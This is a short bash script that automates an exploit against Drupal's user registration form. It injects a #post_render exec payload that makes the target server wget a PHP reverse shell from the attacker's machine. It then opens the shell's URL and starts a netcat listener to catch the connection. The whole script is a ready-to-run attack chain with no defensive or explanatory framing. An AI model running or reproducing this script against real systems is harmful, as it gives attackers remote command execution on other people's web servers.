#!/bin/bash

echo -e '\E[31;40m' "RHOST (IP address)?";tput sgr0
read RHOST
echo -e '\E[32;40m' "RPORT?";tput sgr0
read RPORT
echo -e '\E[33;40m' "LHOST?";tput sgr0
read LHOST
echo -e '\E[34;40m' "LPORT?";tput sgr0
read LPORT
echo -e '\E[35;40m' "Local Web Server Port?";tput sgr0
read WPORT


ls php-reverse-shell.php
if [ $? -ne 0 ]; then
	cp /usr/share/webshells/php/php-reverse-shell.php .
else
	echo -e '\E[34;40m' "You came prepared";tput sgr0
fi

echo -e '\E[36;40m' "Make sure you start a python server on $LHOST port $WPORT";tput sgr0
echo -e '\E[37;40m' "Insert your information into the reverse shell please, your IP is $LHOST with listening port of $LPORT";tput sgr0
sleep 5
nano php-reverse-shell.php
curl -k -i "http://$RHOST:$RPORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=wget http://$LHOST:$WPORT/php-reverse-shell.php"
firefox "$RHOST:$RPORT/php-reverse-shell.php" && nc -lvnp $LPORT
